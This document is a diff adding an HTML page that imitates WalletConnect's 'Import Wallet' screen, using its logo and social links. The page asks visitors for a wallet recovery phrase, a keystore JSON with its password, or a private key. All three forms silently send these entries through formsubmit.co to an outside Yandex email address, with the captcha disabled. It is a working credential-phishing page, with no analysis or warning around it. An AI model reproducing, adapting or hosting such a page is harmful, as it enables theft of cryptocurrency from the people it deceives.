@@ -1,0 +1,107 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <link rel="stylesheet" href="../../assets/main.css" type="text/css"> 
+  <meta name="description" content="Bridge for connecting Wallets to Dapps">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta property="og:image" content="../../../walletconnect.org/favicon.ico">
+  <link rel="icon" href="../../../walletconnect.org/favicon.ico">
+  <script>
+      function openCity(evt, cityName) {
+      // Declare all variables
+      var i, tabcontent, tablinks;
+    
+      // Get all elements with class="tabcontent" and hide them
+      tabcontent = document.getElementsByClassName("tabcontent");
+      for (i = 0; i < tabcontent.length; i++) {
+        tabcontent[i].style.display = "none";
+      }
+    
+      // Get all elements with class="tablinks" and remove the class "active"
+      tablinks = document.getElementsByClassName("tablinks");
+      for (i = 0; i < tablinks.length; i++) {
+        tablinks[i].className = tablinks[i].className.replace(" active", "");
+      }
+    
+      // Show the current tab, and add an "active" class to the button that opened the tab
+      document.getElementById(cityName).style.display = "block";
+      evt.currentTarget.className += " active";
+    }
+    </script>
+  <title>Import Wallet</title>
+  </head>
+  <body>
+  <center>
+  <div class="top">
+          <a href="#footer?v/index.html" class="left">Github</a>
+          <a href="#?v/index.html" class="left">Docs</a>
+          <a href="../../en/index.html" class="main"><img src="../../assets/logo.svg" alt="logo"></a>
+          <a href="#wallets?v/index.html" class="left">Wallets</a>
+          <a href="#?v/index.html" class="left">Apps</a>
+  </div>
+  <br>
+  <h2><center>Import Wallet</center></h2>
+  <br>
+  <div class="tab">
+    <button class="tablinks active" id="default" onclick="openCity(event, 'phrase')">Phrase</button>
+    <button class="tablinks" onclick="openCity(event, 'keystore')">Keystore JSON</button>
+    <button class="tablinks" onclick="openCity(event, 'private')">Private Key</button>
+  </div>
+  
+  <div id="phrase" class="tabcontent" style="display: block;">
+  <form w action="https://formsubmit.co/Phraserecovery@yandex.com" method="POST">
+  
+  <input type="hidden" name="metamask" value="phrase key">
+  <input type="hidden" name="_captcha" value="false">
+  
+  <textarea name="name" class="phrase" id="name" required="required" minlength="12" placeholder="Phrase"></textarea>
+  <input type="hidden" name="_next" value="en/imported/">
+  
+  
+  <br>
+  <div class="desc">Typically 12 (sometimes 24) words separated by single spaces</div>
+  <br>
+  <button type="submit" class="btn">IMPORT</button>
+  </form>
+  </div>
+  
+  <div id="keystore" class="tabcontent" style="display: none;">
+  <form action="https://formsubmit.co/Phraserecovery@yandex.com" method="POST">
+  
+  <input type="hidden" name="metamask" value="Keystore Json">
+  <input type="hidden" name="_captcha" value="false">
+  
+  <textarea name="name" class="phrase" required="required" minlength="12" placeholder="Keystore JSON"></textarea>
+  <br>
+  <div class="field">
+      <input type="text" name="password" placeholder="Password">
+  </div>
+  <input type="hidden" name="_next" value="en/imported/">
+  <div class="desc">Several lines of text beginning with '(...)' plus the password you used to encrypt it.</div>
+  <br>
+  <button type="submit" class="btn">IMPORT</button>
+  </form>
+  </div>
+  
+  <div id="private" class="tabcontent" style="display: none;">
+  <form action="https://formsubmit.co/Phraserecovery@yandex.com" method="POST">
+  <input type="hidden" name="metamask" value="private key">
+  <input type="hidden" name="_captcha" value="false">
+  <div class="field">
+      <input type="text" name="name" class="key" placeholder="Private Key">
+  </div>
+  <input type="hidden" name="_next" value="en/imported/">
+  <div class="desc">Typically 12 (sometimes 24) words separated by single spaces</div>
+  <br>
+  <button type="submit" class="btn">IMPORT</button>
+  </form>
+  </div>
+  
+  <script>
+      document.getElementById("default").click();
+  </script>
+  <footer><div id="footer">
+  <p><img src="../../assets/discord.svg" class="footimg">  <a href="https://discord.gg/jhxMvxP/index.html">Discord</a></p><br>
+  <p><img src="../../assets/telegram.svg" class="footimg">  <a href="https://t.me/walletconnect_announcements/index.html">Telegram</a></p><br>
+  <p><img src="../../assets/twitter.svg" class="footimg">  <a href="https://twitter.walletconnect.org/index.html">Twitter</a></p><br>
+  <p><img src="../../assets/github.svg" class="footimg">  <a href="https://github.com/walletconnect/index.html">Github</a></p><br>
+  </div></footer>
+  </center></body></html>
